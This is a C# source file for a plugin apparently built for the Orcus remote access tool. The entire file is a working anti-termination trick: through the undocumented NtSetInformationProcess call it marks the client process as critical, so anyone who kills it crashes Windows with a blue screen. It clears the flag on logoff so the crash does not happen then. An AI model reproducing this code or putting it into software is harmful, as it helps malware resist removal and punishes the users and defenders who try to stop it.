using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Orcus.Plugins;

namespace BsodProtection
{
    public class Plugin : ClientController
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
            ref int processInformation, int processInformationLength);

        public override void Start()
        {
            int isCritical = 1;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof (int));
            SystemEvents.SessionEnding += SystemEvents_SessionEnding;
        }

        public override void Shutdown()
        {
            Disable();
        }

        public void Disable()
        {
            int isCritical = 0;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof (int));
        }

        private void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            Disable();
        }
    }
}